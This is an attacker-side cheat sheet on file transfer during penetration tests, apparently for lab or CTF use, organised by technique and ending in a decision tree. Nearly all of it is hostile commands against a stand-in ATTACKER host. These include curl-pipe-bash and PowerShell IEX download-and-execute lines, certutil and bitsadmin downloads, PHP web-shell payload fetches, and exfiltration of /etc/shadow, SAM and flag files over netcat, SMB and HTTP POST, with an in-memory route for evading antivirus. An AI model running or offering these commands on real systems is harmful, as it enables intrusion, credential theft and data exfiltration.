# File Transfers Methodology

---

## 1. Python HTTP Server (Attacker → Target)

### On Attacker (serve files)
```bash
# Python 3
python3 -m http.server 8080

# Python 2
python -m SimpleHTTPServer 8080

# Serve from a specific directory
cd /home/kali/tools && python3 -m http.server 8080
```

### On Target — Download
```bash
# wget
wget http://ATTACKER_IP:8080/linpeas.sh -O /tmp/linpeas.sh

# curl
curl http://ATTACKER_IP:8080/linpeas.sh -o /tmp/linpeas.sh

# curl + execute directly (no file on disk)
curl http://ATTACKER_IP:8080/linpeas.sh | bash

# wget + execute
wget -qO- http://ATTACKER_IP:8080/linpeas.sh | bash
```

---

## 2. Netcat File Transfer

### Attacker → Target
```bash
# Attacker (sender)
nc -lvnp 4444 < file_to_send.txt

# Target (receiver)
nc ATTACKER_IP 4444 > received_file.txt
```

### Target → Attacker (exfil)
```bash
# Attacker (listener)
nc -lvnp 4444 > exfiltrated.txt

# Target (sender)
nc ATTACKER_IP 4444 < /etc/shadow
```

---

## 3. SMB Transfers (Windows ↔ Linux)

### Impacket SMB Server (Attacker)
```bash
# Basic share (no auth)
impacket-smbserver share $(pwd) -smb2support

# With authentication (required for Windows 10+)
impacket-smbserver share $(pwd) -smb2support -user admin -password admin123
```

### Windows → Download from SMB
```cmd
:: Copy file from attacker share
copy \\ATTACKER_IP\share\shell.exe C:\Windows\Temp\shell.exe

:: Or with credentials
net use \\ATTACKER_IP\share /user:admin admin123
copy \\ATTACKER_IP\share\shell.exe C:\Windows\Temp\

:: Map as a drive
net use Z: \\ATTACKER_IP\share /user:admin admin123
copy Z:\shell.exe C:\Windows\Temp\
```

### Windows → Upload to SMB (exfil)
```cmd
copy C:\Users\admin\Desktop\flag.txt \\ATTACKER_IP\share\flag.txt
copy C:\Windows\repair\SAM \\ATTACKER_IP\share\SAM
```

---

## 4. PowerShell Transfers (Windows)

### Download Files
```powershell
# DownloadFile (most common)
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/shell.exe','C:\Windows\Temp\shell.exe')

# Invoke-WebRequest (alias: iwr, wget, curl in PS)
Invoke-WebRequest -Uri http://ATTACKER:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
iwr http://ATTACKER:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe

# Download + execute in memory (fileless)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8080/script.ps1')
iex(iwr http://ATTACKER:8080/script.ps1 -UseBasicParsing)

# Certutil (LOLBin — often works when PS is restricted)
certutil -urlcache -split -f http://ATTACKER:8080/shell.exe C:\Windows\Temp\shell.exe
```

### Upload Files (Exfiltration)
```powershell
# Upload via POST to attacker's server
(New-Object Net.WebClient).UploadFile('http://ATTACKER:8080/upload','C:\flag.txt')

# Base64 encode + copy/paste
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\flag.txt'))
# Then on attacker: echo "<b64>" | base64 -d > flag.txt
```

---

## 5. Certutil & Bitsadmin (Windows LOLBins)

```cmd
:: Certutil — download
certutil -urlcache -split -f http://ATTACKER:8080/shell.exe C:\Temp\shell.exe

:: Certutil — base64 decode
certutil -decode encoded.txt decoded.exe

:: Bitsadmin — download (background job)
bitsadmin /transfer myJob /download /priority normal http://ATTACKER:8080/shell.exe C:\Temp\shell.exe
```

---

## 6. SCP & SSH Transfers

```bash
# Download from target to attacker
scp user@TARGET:/etc/passwd ./passwd_copy

# Upload from attacker to target
scp linpeas.sh user@TARGET:/tmp/linpeas.sh

# With key
scp -i id_rsa user@TARGET:/home/user/flag.txt .

# Recursive (directory)
scp -r user@TARGET:/home/user/data ./data

# With non-standard port
scp -P 2222 user@TARGET:/tmp/file .
```

---

## 7. RDP File Transfers

### Mount a Local Drive via xfreerdp
```bash
xfreerdp /v:TARGET /u:admin /p:Password123 /drive:kali,/home/kali/tools
```

### Copy from Mounted Drive (on Windows side)
```cmd
:: The mounted drive appears as \\tsclient\<sharename>
copy \\tsclient\kali\agent.exe C:\Windows\Temp\agent.exe
dir \\tsclient\kali\
```

### Start RDP from Windows
```cmd
:: CMD
mstsc /v:172.16.6.x

:: PowerShell
Start-Process "mstsc" -ArgumentList "/v:172.16.6.x"
```

---

## 8. Base64 Encoding (No Network Needed)

### Linux → Linux (copy-paste through shell)
```bash
# Encode on source
base64 -w 0 file.bin > encoded.txt
cat encoded.txt    # copy this

# Decode on target
echo "<paste_base64_here>" | base64 -d > file.bin

# Verify
md5sum file.bin    # compare both sides
```

### Linux → Windows
```bash
# Encode on Linux
base64 -w 0 shell.exe
# Copy the output

# Decode on Windows (PowerShell)
[IO.File]::WriteAllBytes("C:\Temp\shell.exe", [Convert]::FromBase64String("<paste_here>"))
```

### Windows → Linux
```powershell
# Encode on Windows
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\flag.txt"))
# Copy the output

# Decode on Linux
echo "<paste_here>" | base64 -d > flag.txt
```

---

## 9. PHP / Web Shell Uploads as Transfer

```bash
# If you have a web shell, use it to download tools
# From the web shell:
curl http://ATTACKER:8080/linpeas.sh -o /tmp/linpeas.sh

# Or via PHP
<?php system("wget http://ATTACKER:8080/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf"); ?>

# Or write file via PHP
<?php file_put_contents("/tmp/shell.elf", file_get_contents("http://ATTACKER:8080/shell.elf")); ?>
```

---

## 10. Upload Servers (Target → Attacker)

### Python uploadserver
```bash
# Attacker
pip3 install uploadserver
python3 -m uploadserver 8080

# Target (Linux)
curl -X POST http://ATTACKER:8080/upload -F 'files=@/etc/shadow'

# Target (PowerShell)
(New-Object Net.WebClient).UploadFile('http://ATTACKER:8080/upload', 'C:\flag.txt')
```

### PHP Upload Receiver
```php
<?php
// save as upload.php, serve with php -S 0.0.0.0:8080
$target = "uploads/" . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
echo "Uploaded: " . $target;
?>
```
```bash
# From target
curl -F "file=@/etc/passwd" http://ATTACKER:8080/upload.php
```

---

## 11. Decision Tree

```
Need to transfer a file
├── Attacker → Linux Target
│   ├── Has wget/curl? → python3 -m http.server + wget/curl
│   ├── Has nc? → netcat transfer
│   ├── Has SSH access? → scp
│   ├── No tools? → base64 encode + copy-paste
│   └── Web shell only? → curl/wget from within shell
│
├── Attacker → Windows Target
│   ├── Has PowerShell? → IWR / DownloadFile / DownloadString
│   ├── PS restricted? → certutil or bitsadmin (LOLBins)
│   ├── Has SMB access? → impacket-smbserver + copy
│   ├── Has RDP? → mount drive with xfreerdp /drive:
│   ├── No tools? → base64 encode + PowerShell decode
│   └── AppLocker/AV blocking? → in-memory execution (IEX)
│
├── Target → Attacker (Exfiltration)
│   ├── Linux → nc, scp, curl POST to uploadserver
│   ├── Windows → SMB copy to share, PS UploadFile, base64 + paste
│   └── Web shell → curl POST from within shell
│
└── No Network Between Boxes?
    └── base64 encode → copy through terminal → decode
```
